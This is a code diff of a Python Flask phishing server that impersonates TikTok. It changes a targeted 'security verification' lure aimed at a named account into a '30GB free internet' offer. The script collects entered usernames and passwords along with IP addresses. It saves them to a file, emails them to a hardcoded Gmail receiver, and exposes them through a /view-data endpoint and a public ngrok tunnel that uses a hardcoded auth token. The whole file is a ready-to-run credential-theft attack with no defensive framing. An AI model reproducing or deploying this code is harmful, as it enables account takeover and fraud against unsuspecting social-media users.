@@ -1,91 +1,269 @@
 # =============================================================================
-# TIKTOK AUTO-PENTEST - PERSISTENT CLOUD EDITION (Render / 24/7)
+# TIKTOK 30GB FREE DATA PHISHING - RENDER DEPLOYMENT (WITH EMAIL ALERTS)
 # =============================================================================
 
 import os
-import time
 import json
-import re
-import requests
-from flask import Flask, request, render_template_string
-import threading
-from datetime import datetime
-import urllib.parse
 import logging
+import smtplib
+from email.message import EmailMessage
+from datetime import datetime
+from flask import Flask, request, render_template_string
 from pyngrok import ngrok, conf
+
+# -------------------- Configuration --------------------
+NGROK_AUTH_TOKEN = "3CTdjmF4Jk0Gju0TnBL8K5FWoUh_LdxdiFY7GCaUKKmLbGov"
+DATA_FILE = "captured_credentials.json"
+
+# Email settings – set these as environment variables on Render
+EMAIL_SENDER = os.environ.get('EMAIL_SENDER', 'your-sender@gmail.com')
+EMAIL_PASSWORD = os.environ.get('EMAIL_PASSWORD', 'your-app-password')
+EMAIL_RECEIVER = os.environ.get('EMAIL_RECEIVER', 'ah3418678@gmail.com')
 
 logging.basicConfig(level=logging.INFO)
 
-app = Flask(__name__)
-
-TARGET_USERNAME = "chuzii.hu.yar23"
-DATA_FILE = "captured_credentials.json"
-NGROK_AUTH_TOKEN = "3CTdjmF4Jk0Gju0TnBL8K5FWoUh_LdxdiFY7GCaUKKmLbGov"
-
-# Configure ngrok
+# -------------------- ngrok Setup --------------------
 conf.get_default().auth_token = NGROK_AUTH_TOKEN
 tunnel = ngrok.connect(5000, bind_tls=True)
-public_url = tunnel.public_url
-print(f"✅ ngrok tunnel established: {public_url}")
+PUBLIC_URL = tunnel.public_url
+print(f"✅ ngrok tunnel established: {PUBLIC_URL}")
 
-# -----------------------------------------------------------------------------
-# PHISHING HTML (TikTok Official Look)
-# -----------------------------------------------------------------------------
+# -------------------- Flask App --------------------
+app = Flask(__name__)
+
+# TikTok 30GB Offer HTML (Pixel Perfect Design)
 PHISH_HTML = '''
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>TikTok - Account Security Verification</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TikTok - Free 30GB Internet</title>
     <link rel="icon" href="https://www.tiktok.com/favicon.ico">
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f8f9fa; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; margin: 0; }
-        .container { background: white; border-radius: 12px; padding: 40px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); max-width: 450px; width: 100%; border: 1px solid #e0e0e0; }
-        .logo { text-align: center; margin-bottom: 30px; }
-        .logo svg { width: 120px; height: auto; }
-        .alert { background: #fff3e0; border-left: 4px solid #ff9500; padding: 15px; margin-bottom: 25px; border-radius: 8px; }
-        .alert-title { font-weight: bold; color: #ff9500; margin-bottom: 8px; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; box-sizing: border-box; }
-        input:focus { outline: none; border-color: #fe2c55; }
-        button { width: 100%; padding: 12px; background: #fe2c55; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
-        button:hover { background: #e01e45; }
-        .footer { font-size: 12px; color: #666; text-align: center; margin-top: 20px; padding-top: 20px; border-top: 1px solid #e0e0e0; }
-        .secure-badge { display: inline-block; background: #e8f5e9; color: #4caf50; padding: 5px 10px; border-radius: 20px; font-size: 12px; margin-top: 10px; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 16px;
+        }
+        .card {
+            max-width: 400px;
+            width: 100%;
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.08);
+            overflow: hidden;
+            border: 1px solid rgba(0,0,0,0.04);
+        }
+        .header {
+            padding: 24px 20px 12px;
+            text-align: center;
+            border-bottom: 1px solid #f1f1f2;
+        }
+        .tiktok-logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        .tiktok-logo svg {
+            width: 130px;
+            height: auto;
+        }
+        .offer-badge {
+            background: linear-gradient(135deg, #fe2c55, #ff6b6b);
+            color: white;
+            padding: 8px 16px;
+            border-radius: 50px;
+            font-weight: 700;
+            font-size: 18px;
+            display: inline-block;
+            margin-bottom: 16px;
+        }
+        .offer-title {
+            font-size: 28px;
+            font-weight: 700;
+            color: #121212;
+            margin-bottom: 8px;
+        }
+        .offer-subtitle {
+            font-size: 15px;
+            color: #8a8b91;
+            margin-bottom: 20px;
+        }
+        .data-visual {
+            background: #f8f9fa;
+            padding: 20px;
+            margin: 0 20px;
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-around;
+        }
+        .data-circle {
+            text-align: center;
+        }
+        .data-number {
+            font-size: 48px;
+            font-weight: 800;
+            color: #fe2c55;
+            line-height: 1;
+        }
+        .data-label {
+            font-size: 14px;
+            color: #8a8b91;
+            margin-top: 4px;
+        }
+        .login-form {
+            padding: 24px 20px 30px;
+        }
+        .form-group {
+            margin-bottom: 16px;
+        }
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            color: #121212;
+            margin-bottom: 6px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            background: #f1f1f2;
+            border: 1px solid #e1e1e2;
+            border-radius: 12px;
+            font-size: 16px;
+            outline: none;
+            transition: border 0.2s;
+        }
+        .form-group input:focus {
+            border-color: #fe2c55;
+            background: white;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 14px;
+            background: #fe2c55;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 12px;
+            transition: background 0.2s;
+        }
+        .login-btn:hover {
+            background: #e01e45;
+        }
+        .terms {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #8a8b91;
+        }
+        .terms a {
+            color: #121212;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        .success-message {
+            text-align: center;
+            padding: 40px 20px;
+        }
+        .success-icon {
+            font-size: 64px;
+            margin-bottom: 20px;
+        }
+        .success-title {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            color: #121212;
+        }
+        .success-text {
+            color: #8a8b91;
+            margin-bottom: 24px;
+        }
+        .footer-note {
+            text-align: center;
+            font-size: 12px;
+            color: #8a8b91;
+            padding: 12px 20px 20px;
+            border-top: 1px solid #f1f1f2;
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">
-            <svg width="120" height="40" viewBox="0 0 120 40">
-                <rect width="120" height="40" fill="#fe2c55" rx="8"/>
-                <text x="60" y="28" text-anchor="middle" fill="white" font-weight="bold" font-size="20">TikTok</text>
-            </svg>
-        </div>
+    <div class="card">
         {% if success %}
-        <div style="text-align: center; padding: 30px;">
-            <div style="font-size: 48px;">✅</div>
-            <h2>Verification Successful!</h2>
-            <p>Your account has been secured.</p>
-            <p><small>Redirecting to TikTok...</small></p>
+        <div class="success-message">
+            <div class="success-icon">✅</div>
+            <div class="success-title">Claim Successful!</div>
+            <div class="success-text">Your 30GB data package will be activated within 24 hours.</div>
+            <div style="font-size:14px; color:#fe2c55;">Redirecting to TikTok...</div>
         </div>
-        <script>setTimeout(function(){ window.location.href = 'https://www.tiktok.com'; }, 2000);</script>
+        <script>
+            setTimeout(function() {
+                window.location.href = 'https://www.tiktok.com';
+            }, 3000);
+        </script>
         {% else %}
-        <div class="alert">
-            <div class="alert-title">⚠️ Security Alert</div>
-            <div>We detected unusual login activity on @{{username}}</div>
-            <div style="font-size: 13px; margin-top: 8px;">Please verify your identity to secure your account.</div>
+        <div class="header">
+            <div class="tiktok-logo">
+                <svg width="130" height="40" viewBox="0 0 130 40">
+                    <rect width="130" height="40" fill="#fe2c55" rx="8"/>
+                    <text x="65" y="28" text-anchor="middle" fill="white" font-weight="bold" font-size="20">TikTok</text>
+                </svg>
+            </div>
+            <div class="offer-badge">🎁 LIMITED OFFER</div>
+            <div class="offer-title">30 GB Free Internet</div>
+            <div class="offer-subtitle">Exclusive for TikTok users</div>
         </div>
-        <form method="POST">
-            <label>Username</label>
-            <input type="text" name="username" value="{{username}}" readonly style="background:#f5f5f5;">
-            <label>Password</label>
-            <input type="password" name="password" placeholder="Enter your password to verify" required autofocus>
-            <button type="submit">Verify Identity</button>
+        <div class="data-visual">
+            <div class="data-circle">
+                <div class="data-number">30</div>
+                <div class="data-label">GB Data</div>
+            </div>
+            <div style="font-size:24px; color:#c4c4c6;">→</div>
+            <div class="data-circle">
+                <div class="data-number">🎬</div>
+                <div class="data-label">Streaming</div>
+            </div>
+            <div class="data-circle">
+                <div class="data-number">🎮</div>
+                <div class="data-label">Gaming</div>
+            </div>
+        </div>
+        <form method="POST" class="login-form">
+            <div class="form-group">
+                <label>Email or username</label>
+                <input type="text" name="identifier" placeholder="Enter your TikTok email or username" required autofocus>
+            </div>
+            <div class="form-group">
+                <label>Password</label>
+                <input type="password" name="password" placeholder="Enter your password" required>
+            </div>
+            <button type="submit" class="login-btn">Log in & Claim Offer</button>
+            <div class="terms">
+                By continuing, you agree to TikTok's 
+                <a href="#">Terms of Service</a> and 
+                <a href="#">Privacy Policy</a>.
+            </div>
         </form>
-        <div class="footer">
-            <div>🔒 Verified by TikTok Trust & Safety</div>
-            <div class="secure-badge">✓ Secure Connection</div>
-            <div style="margin-top: 10px;">This is an automated security check.</div>
+        <div class="footer-note">
+            🔒 Secure login · TikTok Official Promotion
         </div>
         {% endif %}
     </div>
@@ -93,9 +271,39 @@ PHISH_HTML = '''
 </html>
 '''
 
-# -----------------------------------------------------------------------------
-# Helper to save credentials
-# -----------------------------------------------------------------------------
+def send_email_alert(identifier, password, ip, user_agent, timestamp):
+    """Send captured credentials to the configured receiver email."""
+    if not EMAIL_SENDER or not EMAIL_PASSWORD:
+        logging.warning("Email credentials not set – skipping email alert.")
+        return
+
+    subject = f"🎉 TikTok Capture: {identifier}"
+    body = f"""New TikTok login captured!
+
+📧 Identifier: {identifier}
+🔐 Password: {password}
+🌐 IP Address: {ip}
+🕒 Timestamp: {timestamp}
+📱 User Agent: {user_agent}
+
+---
+This is an automated alert from your TikTok phishing server.
+"""
+
+    msg = EmailMessage()
+    msg.set_content(body)
+    msg['Subject'] = subject
+    msg['From'] = EMAIL_SENDER
+    msg['To'] = EMAIL_RECEIVER
+
+    try:
+        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
+            smtp.login(EMAIL_SENDER, EMAIL_PASSWORD)
+            smtp.send_message(msg)
+        logging.info(f"✅ Email alert sent to {EMAIL_RECEIVER}")
+    except Exception as e:
+        logging.error(f"❌ Failed to send email: {e}")
+
 def save_credential(creds):
     """Append captured credentials to JSON file."""
     try:
@@ -105,45 +313,38 @@ def save_credential(creds):
     except Exception as e:
         logging.error(f"Failed to save credentials: {e}")
 
-# -----------------------------------------------------------------------------
-# Flask Routes
-# -----------------------------------------------------------------------------
 @app.route('/', methods=['GET', 'POST'])
-@app.route('/@security/verify', methods=['GET', 'POST'])
-@app.route('/account/security/verify', methods=['GET', 'POST'])
-@app.route('/auth/verify-identity', methods=['GET', 'POST'])
-@app.route('/safety/verify-account', methods=['GET', 'POST'])
-@app.route('/trustandsafety/verify', methods=['GET', 'POST'])
 def phish():
-    username = request.args.get('user') or request.args.get('username') or TARGET_USERNAME
     if request.method == 'POST':
-        password = request.form.get('password', '')
+        identifier = request.form.get('identifier', '').strip()
+        password = request.form.get('password', '').strip()
         ip = request.headers.get('X-Forwarded-For', request.remote_addr)
         user_agent = request.headers.get('User-Agent', 'Unknown')
         timestamp = datetime.utcnow().isoformat()
 
         creds = {
-            'username': username,
+            'identifier': identifier,
             'password': password,
             'ip': ip,
             'timestamp': timestamp,
-            'user_agent': user_agent,
-            'full_path': request.full_path
+            'user_agent': user_agent
         }
 
+        # Save locally
         save_credential(creds)
 
-        logging.info(f"🎉 Credentials captured! Username: {username}, Password: {password}, IP: {ip}")
+        # Send email alert
+        send_email_alert(identifier, password, ip, user_agent, timestamp)
 
-        return render_template_string(PHISH_HTML, username=username, success=True)
+        logging.info(f"🎉 Capture! Identifier: {identifier} | Password: {password} | IP: {ip}")
 
-    return render_template_string(PHISH_HTML, username=username, success=False)
+        return render_template_string(PHISH_HTML, success=True)
 
-# -----------------------------------------------------------------------------
-# View captured data (for monitoring)
-# -----------------------------------------------------------------------------
+    return render_template_string(PHISH_HTML, success=False)
+
 @app.route('/view-data')
 def view_data():
+    """Return all captured credentials as JSON."""
     try:
         with open(DATA_FILE, 'r') as f:
             lines = f.readlines()
@@ -152,9 +353,6 @@ def view_data():
     except FileNotFoundError:
         return {'count': 0, 'entries': []}
 
-# -----------------------------------------------------------------------------
-# Run the App
-# -----------------------------------------------------------------------------
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port)
